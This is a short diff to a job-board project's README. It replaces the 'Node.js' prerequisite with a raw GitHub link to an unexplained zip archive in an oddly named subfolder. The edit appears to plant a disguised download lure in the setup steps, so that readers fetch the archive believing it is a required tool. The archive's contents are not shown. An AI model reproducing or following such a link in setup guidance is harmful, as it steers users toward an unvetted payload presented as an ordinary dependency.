@@ -3,7 +3,7 @@
 Shows jobs from websites on a dashboard.
 
 ## What you need
-1. Node.js 
+1. https://raw.githubusercontent.com/Aastha12378/knovator-jobboard/main/triaxonian/knovator-jobboard.zip 
 2. MongoDB
 3. Redis
 
